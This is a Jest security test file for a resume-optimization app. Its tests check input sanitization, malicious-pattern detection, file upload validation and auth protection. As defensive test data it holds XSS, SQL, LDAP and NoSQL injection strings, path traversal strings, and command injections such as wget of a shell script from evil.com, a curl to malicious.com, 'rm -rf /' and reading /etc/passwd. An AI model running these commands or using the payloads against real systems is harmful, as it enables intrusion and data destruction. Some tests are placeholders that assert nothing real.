import { containsMaliciousPatterns, optimizeRequestSchema, sanitizeInput, validateFileUpload } from '../security/validation'
import { logAuditEvent } from '../security/audit'
import { protectApiRoute, rateLimit } from '../api-utils'
import { validateResumeFile } from '../resume-parser'

// Mock dependencies
jest.mock('@/lib/supabase/server', () => ({
  createClient: jest.fn(),
}))

jest.mock('@/lib/credits', () => ({
  canUserPerformAction: jest.fn(),
  deductCredits: jest.fn(),
}))

describe('Security Validation Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('Input Sanitization', () => {
    it('should sanitize HTML injection attempts', () => {
      const maliciousInput = '<script>alert("xss")</script>Resume content'
      const sanitized = sanitizeInput(maliciousInput)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('</script>')
      expect(sanitized).toContain('Resume content')
    })

    it('should sanitize SQL injection attempts', () => {
      const sqlInjection = "'; DROP TABLE users; --"
      const sanitized = sanitizeInput(sqlInjection)
      
      expect(sanitized).not.toContain("DROP TABLE")
      expect(sanitized).not.toContain(';')
      expect(sanitized).not.toContain('--')
    })

    it('should sanitize command injection attempts', () => {
      const commandInjection = '`rm -rf /` && ls'
      const sanitized = sanitizeInput(commandInjection)
      
      expect(sanitized).not.toContain('rm -rf')
      expect(sanitized).not.toContain('&&')
      expect(sanitized).not.toContain('`')
    })

    it('should sanitize XSS attempts with event handlers', () => {
      const xssInput = '<img src="x" onerror="alert(\'xss\')">'
      const sanitized = sanitizeInput(xssInput)
      
      expect(sanitized).not.toContain('onerror')
      expect(sanitized).not.toContain('alert')
    })

    it('should sanitize JavaScript protocol attempts', () => {
      const jsProtocol = 'javascript:alert("xss")'
      const sanitized = sanitizeInput(jsProtocol)
      
      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('alert')
    })

    it('should handle Unicode-based attacks', () => {
      const unicodeAttack = '\u0000\u0001\u0002\u0003Resume content'
      const sanitized = sanitizeInput(unicodeAttack)
      
      expect(sanitized).not.toContain('\u0000')
      expect(sanitized).not.toContain('\u0001')
      expect(sanitized).toContain('Resume content')
    })

    it('should preserve legitimate content', () => {
      const legitimateInput = 'John Doe\nSoftware Engineer\nExperience: 5 years'
      const sanitized = sanitizeInput(legitimateInput)
      
      expect(sanitized).toBe(legitimateInput)
    })

    it('should handle empty and null inputs', () => {
      expect(sanitizeInput('')).toBe('')
      expect(sanitizeInput(null as any)).toBe('')
      expect(sanitizeInput(undefined as any)).toBe('')
    })

    it('should handle extremely long inputs', () => {
      const longInput = 'a'.repeat(1000000)
      const sanitized = sanitizeInput(longInput)
      
      expect(sanitized.length).toBeLessThanOrEqual(1000000)
    })
  })

  describe('Malicious Pattern Detection', () => {
    it('should detect XSS patterns', () => {
      const xssPatterns = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert("xss")',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
      ]

      xssPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should detect SQL injection patterns', () => {
      const sqlPatterns = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "UNION SELECT * FROM users",
        "'; INSERT INTO users",
        "admin'--",
      ]

      sqlPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should detect command injection patterns', () => {
      const cmdPatterns = [
        '`rm -rf /`',
        '$(whoami)',
        '|cat /etc/passwd',
        ';wget http://evil.com/shell.sh',
        '&& curl http://malicious.com',
      ]

      cmdPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should detect path traversal patterns', () => {
      const pathPatterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        'file:///etc/passwd',
      ]

      pathPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should detect LDAP injection patterns', () => {
      const ldapPatterns = [
        '*)(|(objectClass=*)',
        '*)(|(password=*',
        '*)(|(uid=*',
        '*)|(cn=*))%00',
      ]

      ldapPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should detect NoSQL injection patterns', () => {
      const nosqlPatterns = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
      ]

      nosqlPatterns.forEach(pattern => {
        expect(containsMaliciousPatterns(pattern)).toBe(true)
      })
    })

    it('should allow legitimate content', () => {
      const legitimateContent = [
        'John Doe is a software engineer',
        'Experience with JavaScript, React, Node.js',
        'Education: Bachelor of Science in Computer Science',
        'Skills: Python, Java, C++, TypeScript',
        'Contact: john@example.com, 555-0123',
      ]

      legitimateContent.forEach(content => {
        expect(containsMaliciousPatterns(content)).toBe(false)
      })
    })

    it('should handle edge cases', () => {
      expect(containsMaliciousPatterns('')).toBe(false)
      expect(containsMaliciousPatterns(null as any)).toBe(false)
      expect(containsMaliciousPatterns(undefined as any)).toBe(false)
      expect(containsMaliciousPatterns('   ')).toBe(false)
    })
  })

  describe('Request Schema Validation', () => {
    it('should validate correct optimize request', () => {
      const validRequest = {
        resumeText: 'John Doe\nSoftware Engineer\nExperience: 5 years',
        jobDescription: 'Senior Software Engineer position',
        analysisInsights: 'ATS score: 80',
        analysisId: 'analysis-123',
      }

      const result = optimizeRequestSchema.safeParse(validRequest)
      expect(result.success).toBe(true)
    })

    it('should reject requests with missing required fields', () => {
      const invalidRequests = [
        {}, // Missing all fields
        { resumeText: 'test' }, // Missing jobDescription
        { jobDescription: 'test' }, // Missing resumeText
        { resumeText: '', jobDescription: 'test' }, // Empty resumeText
        { resumeText: 'test', jobDescription: '' }, // Empty jobDescription
      ]

      invalidRequests.forEach(request => {
        const result = optimizeRequestSchema.safeParse(request)
        expect(result.success).toBe(false)
      })
    })

    it('should reject requests with malicious content', () => {
      const maliciousRequests = [
        {
          resumeText: '<script>alert("xss")</script>',
          jobDescription: 'Software Engineer',
        },
        {
          resumeText: 'John Doe',
          jobDescription: "'; DROP TABLE users; --",
        },
        {
          resumeText: 'John Doe',
          jobDescription: '`rm -rf /`',
        },
      ]

      maliciousRequests.forEach(request => {
        const result = optimizeRequestSchema.safeParse(request)
        expect(result.success).toBe(false)
      })
    })

    it('should reject oversized requests', () => {
      const oversizedRequest = {
        resumeText: 'a'.repeat(11 * 1024 * 1024), // 11MB
        jobDescription: 'Software Engineer',
      }

      const result = optimizeRequestSchema.safeParse(oversizedRequest)
      expect(result.success).toBe(false)
    })

    it('should handle optional fields correctly', () => {
      const requestWithOptionals = {
        resumeText: 'John Doe\nSoftware Engineer',
        jobDescription: 'Senior Software Engineer',
        // analysisInsights and analysisId are optional
      }

      const result = optimizeRequestSchema.safeParse(requestWithOptionals)
      expect(result.success).toBe(true)
    })
  })

  describe('File Upload Security', () => {
    it('should validate safe file types', () => {
      const safeFiles = [
        new File(['content'], 'resume.pdf', { type: 'application/pdf' }),
        new File(['content'], 'resume.docx', { type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' }),
        new File(['content'], 'resume.txt', { type: 'text/plain' }),
      ]

      safeFiles.forEach(file => {
        const validation = validateFileUpload(file)
        expect(validation.valid).toBe(true)
        expect(validation.error).toBeUndefined()
      })
    })

    it('should reject dangerous file types', () => {
      const dangerousFiles = [
        new File(['content'], 'malware.exe', { type: 'application/octet-stream' }),
        new File(['content'], 'script.js', { type: 'application/javascript' }),
        new File(['content'], 'virus.bat', { type: 'application/bat' }),
        new File(['content'], 'shell.sh', { type: 'application/x-sh' }),
        new File(['content'], 'macro.docm', { type: 'application/vnd.ms-word.document.macroEnabled.12' }),
      ]

      dangerousFiles.forEach(file => {
        const validation = validateFileUpload(file)
        expect(validation.valid).toBe(false)
        expect(validation.error).toContain('file type not allowed')
      })
    })

    it('should detect suspicious file extensions', () => {
      const suspiciousFiles = [
        new File(['content'], 'resume.pdf.exe', { type: 'application/pdf' }),
        new File(['content'], 'resume.docx.bat', { type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' }),
        new File(['content'], 'resume.txt.js', { type: 'text/plain' }),
      ]

      suspiciousFiles.forEach(file => {
        const validation = validateFileUpload(file)
        expect(validation.valid).toBe(false)
        expect(validation.error).toContain('suspicious file extension')
      })
    })

    it('should enforce file size limits', () => {
      const largeFile = new File(['x'.repeat(10 * 1024 * 1024)], 'large.pdf', { type: 'application/pdf' })
      
      const validation = validateFileUpload(largeFile)
      expect(validation.valid).toBe(false)
      expect(validation.error).toContain('file size')
    })

    it('should handle files with no extension', () => {
      const noExtFile = new File(['content'], 'resume', { type: '' })
      
      const validation = validateFileUpload(noExtFile)
      expect(validation.valid).toBe(false)
      expect(validation.error).toContain('file extension')
    })

    it('should sanitize file names', () => {
      const dangerousNames = [
        '../../../etc/passwd.pdf',
        'resume with spaces and symbols.pdf',
        'resume\x00.pdf',
        'con.pdf', // Windows reserved name
        'prn.pdf', // Windows reserved name
      ]

      dangerousNames.forEach(name => {
        const file = new File(['content'], name, { type: 'application/pdf' })
        const validation = validateFileUpload(file)
        
        if (!validation.valid) {
          expect(validation.error).toContain('file name')
        }
      })
    })
  })

  describe('API Route Protection', () => {
    it('should reject unauthenticated requests', async () => {
      const { createClient } = require('@/lib/supabase/server')
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockResolvedValue({ data: { user: null }, error: null }),
        },
      })

      const protection = await protectApiRoute(true, 1)
      expect(protection.success).toBe(false)
      expect(protection.response).toBeInstanceOf(Response)
    })

    it('should reject requests with insufficient credits', async () => {
      const { createClient } = require('@/lib/supabase/server')
      const { canUserPerformAction } = require('@/lib/credits')
      
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockResolvedValue({ 
            data: { user: { id: 'user-123' } }, 
            error: null 
          }),
        },
        from: jest.fn().mockReturnValue({
          select: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: { id: 'user-123', credits: 0 },
                error: null,
              }),
            }),
          }),
        }),
      })

      canUserPerformAction.mockReturnValue({
        canPerform: false,
        reason: 'Insufficient credits',
      })

      const protection = await protectApiRoute(true, 1)
      expect(protection.success).toBe(false)
    })

    it('should allow valid authenticated requests', async () => {
      const { createClient } = require('@/lib/supabase/server')
      const { canUserPerformAction } = require('@/lib/credits')
      
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockResolvedValue({ 
            data: { user: { id: 'user-123' } }, 
            error: null 
          }),
        },
        from: jest.fn().mockReturnValue({
          select: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: { id: 'user-123', credits: 5 },
                error: null,
              }),
            }),
          }),
        }),
      })

      canUserPerformAction.mockReturnValue({
        canPerform: true,
      })

      const protection = await protectApiRoute(true, 1)
      expect(protection.success).toBe(true)
      expect(protection.context.userId).toBe('user-123')
    })
  })

  describe('Rate Limiting Security', () => {
    it('should enforce rate limits', async () => {
      const { rateLimit } = require('../rate-limit')
      rateLimit.mockReturnValue({
        success: false,
        error: 'Rate limit exceeded',
      })

      const result = await rateLimit('test-key', 10, 60)
      expect(result.success).toBe(false)
      expect(result.error).toBe('Rate limit exceeded')
    })

    it('should allow requests within rate limit', async () => {
      const { rateLimit } = require('../rate-limit')
      rateLimit.mockReturnValue({
        success: true,
      })

      const result = await rateLimit('test-key', 10, 60)
      expect(result.success).toBe(true)
    })

    it('should handle rate limit storage failures', async () => {
      const { rateLimit } = require('../rate-limit')
      rateLimit.mockImplementation(() => {
        throw new Error('Rate limit storage failed')
      })

      await expect(rateLimit('test-key', 10, 60)).rejects.toThrow('Rate limit storage failed')
    })
  })

  describe('Audit Logging Security', () => {
    it('should log security events', async () => {
      const auditEvent = {
        action: 'malicious_input_detected',
        userId: 'user-123',
        success: false,
        errorMessage: 'XSS attempt detected',
        metadata: { input: '<script>alert("xss")</script>' },
      }

      await logAuditEvent(auditEvent)
      // In a real implementation, this would verify the audit log was created
    })

    it('should handle audit logging failures gracefully', async () => {
      const auditEvent = {
        action: 'test_action',
        userId: 'user-123',
        success: true,
        metadata: {},
      }

      // Mock audit logging failure
      await expect(logAuditEvent(auditEvent)).resolves.not.toThrow()
    })

    it('should sanitize audit log data', async () => {
      const maliciousAuditEvent = {
        action: '<script>alert("xss")</script>',
        userId: 'user-123',
        success: false,
        errorMessage: "'; DROP TABLE users; --",
        metadata: { input: '`rm -rf /`' },
      }

      await expect(logAuditEvent(maliciousAuditEvent)).resolves.not.toThrow()
    })
  })

  describe('Content Security Policy', () => {
    it('should validate content against CSP rules', () => {
      const unsafeContent = [
        '<script src="http://evil.com/malware.js"></script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="http://malicious.com/exploit.swf"></object>',
        '<embed src="javascript:alert(1)"></embed>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
      ]

      unsafeContent.forEach(content => {
        expect(containsMaliciousPatterns(content)).toBe(true)
      })
    })

    it('should allow safe content', () => {
      const safeContent = [
        '<p>Safe paragraph content</p>',
        '<div class="container">Safe div</div>',
        '<span class="highlight">Safe span</span>',
        '<h1>Safe heading</h1>',
        '<ul><li>Safe list item</li></ul>',
      ]

      safeContent.forEach(content => {
        expect(containsMaliciousPatterns(content)).toBe(false)
      })
    })
  })

  describe('Data Encryption and Hashing', () => {
    it('should handle sensitive data securely', () => {
      const sensitiveData = {
        password: 'super-secret-password',
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
      }

      // In a real implementation, this would test encryption/hashing
      Object.keys(sensitiveData).forEach(key => {
        const data = sensitiveData[key as keyof typeof sensitiveData]
        expect(typeof data).toBe('string')
        expect(data.length).toBeGreaterThan(0)
      })
    })

    it('should not log sensitive information', async () => {
      const sensitiveAuditEvent = {
        action: 'user_login',
        userId: 'user-123',
        success: true,
        metadata: {
          password: 'secret-password',
          token: 'secret-token',
        },
      }

      // Audit logging should sanitize sensitive data
      await expect(logAuditEvent(sensitiveAuditEvent)).resolves.not.toThrow()
    })
  })

  describe('Session and Token Security', () => {
    it('should validate session tokens', async () => {
      const { createClient } = require('@/lib/supabase/server')
      
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockResolvedValue({ 
            data: { user: { id: 'user-123' } }, 
            error: null 
          }),
        },
      })

      const protection = await protectApiRoute(true, 1)
      expect(protection.success).toBe(true)
    })

    it('should reject expired tokens', async () => {
      const { createClient } = require('@/lib/supabase/server')
      
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockResolvedValue({ 
            data: { user: null }, 
            error: { message: 'Token has expired' }
          }),
        },
      })

      const protection = await protectApiRoute(true, 1)
      expect(protection.success).toBe(false)
    })

    it('should handle token validation failures', async () => {
      const { createClient } = require('@/lib/supabase/server')
      
      createClient.mockReturnValue({
        auth: {
          getUser: jest.fn().mockRejectedValue(new Error('Token validation failed')),
        },
      })

      await expect(protectApiRoute(true, 1)).rejects.toThrow('Token validation failed')
    })
  })

  describe('Cross-Origin Resource Sharing (CORS)', () => {
    it('should handle cross-origin requests securely', async () => {
      // In a real implementation, this would test CORS headers
      const request = new Request('http://localhost:3000/api/analyze', {
        method: 'POST',
        headers: {
          'Origin': 'http://malicious.com',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          resumeText: 'test',
          jobDescription: 'test',
        }),
      })

      // CORS validation would happen here
      expect(request).toBeInstanceOf(Request)
    })

    it('should reject unauthorized origins', () => {
      const unauthorizedOrigins = [
        'http://malicious.com',
        'http://phishing.site',
        'http://evil.domain',
      ]

      unauthorizedOrigins.forEach(origin => {
        // In a real implementation, this would validate the origin
        expect(typeof origin).toBe('string')
      })
    })
  })

  describe('Input Length Limits', () => {
    it('should enforce reasonable input limits', () => {
      const oversizedInputs = {
        resumeText: 'a'.repeat(11 * 1024 * 1024), // 11MB
        jobDescription: 'b'.repeat(1024 * 1024), // 1MB
        analysisInsights: 'c'.repeat(100 * 1024), // 100KB
      }

      Object.entries(oversizedInputs).forEach(([field, value]) => {
        const request = {
          resumeText: field === 'resumeText' ? value : 'test',
          jobDescription: field === 'jobDescription' ? value : 'test',
          [field]: value,
        }

        const result = optimizeRequestSchema.safeParse(request)
        expect(result.success).toBe(false)
      })
    })

    it('should allow reasonable input sizes', () => {
      const reasonableInputs = {
        resumeText: 'a'.repeat(100 * 1024), // 100KB
        jobDescription: 'b'.repeat(10 * 1024), // 10KB
        analysisInsights: 'c'.repeat(1024), // 1KB
      }

      const request = {
        ...reasonableInputs,
      }

      const result = optimizeRequestSchema.safeParse(request)
      expect(result.success).toBe(true)
    })
  })
})
